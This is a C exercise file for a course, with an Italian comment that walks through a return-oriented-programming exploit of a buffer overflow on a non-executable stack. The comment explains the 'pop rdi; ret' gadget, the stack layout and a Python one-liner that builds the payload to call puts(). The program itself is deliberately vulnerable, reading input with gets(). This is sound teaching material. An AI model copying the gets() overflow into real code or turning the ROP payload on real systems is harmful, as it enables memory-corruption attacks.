/* stack5-stdin.c                               *
 * specially crafted to feed your brain by gera */

/*

Esercizio basato su stack5.c di Gera con la variante che non abbiamo lo stack eseguibile, ma tramite il buffer overflow possiamo comunque controllare l ' instruction pointer
> "gcc -fno-stack-protector -w -o gera_5_nx gera_5_nx.c" il per compilare il file c

Come accennato a lezione, l' idea qui è quella di sfruttare funzioni già esistenti (ad esempio quelle della libc) per stampare "You Win!". La funzione puts() fa al caso nostro.
Ovviamente non possiamo chiamarla direttamente perché dobbiamo anche trovare un modo per passare correttamente il puntatore alla stringa "You Win!" come parametro. La stringa
inoltre deve essere inserita in memoria.

Concentriamoci sul passaggio di parametri. puts() richiedere nel registro RDI un puntatore a una stringa, quindi in qualche modo dobbiamo ottenere il controllo sulla scrittura del registro per
poterlo modificare e inserire un valore.
Considerando che l' unica area di memoria che controlliamo è lo stack, possiamo cercare un gadget, ovvero una sequenza di istruzioni assembly eseguibili già in memoria, che fa questo:

pop rdi -> Leggere un valore dallo stack e lo salva in RDI
ret     -> Leggere un valore dallo stack e lo usa come prossimo RIP (classico return di una funzione)

Grazie a questo gadget possiamo costruire lo stack un questo modo

+-----------------------+
| --- High Address ---  |
+-----------------------+
|      puts() addr      |
+-----------------------+
|  pointer to stirng    |
+-----------------------+
|      gadget addr      |      
+-----------------------+  <- RSP of main at the end of the function 

In questa situazione, al termine della funzione main, l' indirizzo al quale ritornare viene letto dallo stack, dove avremo appositamente inserito quello del gadget.
L' esecuzione, spostandosi al gadget, toglie un valore dallo stack (puntatore alla stringa) e lo salva in RDI. Questo puntatore deve fare riferimento ad una memoria nella
quale è stato scritto il valore "You Win!": possiamo usare direttamente il nostro buffer che viene riempito tramite gets().
Dopodiche verrà eseguita la RET del gadget, che sposterà l' esecuzione alla funzione puts(), completando la chain

Per costruire il buffer:
> python3 -c "import sys; sys.stdout.buffer.write(b'You Win\x00' + (b'A' * 96) + b'\x6e\x11\x40\x00\x00\x00\x00\x00' + b'\x70\xdd\xff\xff\xff\x7f\x00\x00' + b'\x50\xee\xe0\xf7\xff\x7f\x00\x00')" > payload_gera_5_nx

Vi faccio notare i fari blocchi in ordine dall' inizio del buffer alla fine (high address dello stack)
- [Begin of the buffer] Stringa "You Win" + terminatore (8 bytes)
- 96 bytes inutilizzati che servono solo ad arrivare a sovrascrivere il return address
- Indirizzo del gadget
- Puntatore all' inizio del nostro buffer
- Indirizzo della puts()


NB: Il gadget in questo esempio è stato inserito per comodità direttamente nel codice e l' indirizzo stampato a video.
Il compilatore potrebbe però introdurre prologo ed epilogo per la funzione gadget(), quindi verificare sempre con GDB quale è l' indirizzo corretto
dell' istruzione "pop rdi"

Nel mio caso, ad esempio, la funzione gadget viene compilata in questo modo:

(gdb) disass gadget
Dump of assembler code for function gadget:
   0x0000000000401166 <+0>:     endbr64
   0x000000000040116a <+4>:     push   rbp
   0x000000000040116b <+5>:     mov    rbp,rsp
   0x000000000040116e <+8>:     pop    rdi
   0x000000000040116f <+9>:     ret
   0x0000000000401170 <+10>:    nop
   0x0000000000401171 <+11>:    pop    rbp
   0x0000000000401172 <+12>:    ret

A noi serve l' indirizzo che punta all' istruzione "pop rdi", nel mio caso 0x000000000040116e. Nel caso dovesse cambiare l' indirizzo della funzione tra l' esecuzione normale
e quella con GDB, potete sempre usare l' offset per calcolare l' indirizzo di destinazione corretto del gadget

*/

#include <stdio.h>
#include <stdlib.h>

int gadget()
{
    asm(
        "pop %rdi\n"
        "ret");
}
int main()
{
    int cookie;
    char buf[80];

    printf("puts(): %16lx:\n", &puts);
    printf("gadget(): %16lx:\n", &gadget);
    printf("buf: %16lx cookie: %16lx\n", &buf, &cookie);
    gets(buf);

    if (cookie == 0x000d0a00)
        printf("you loose!\n");
}

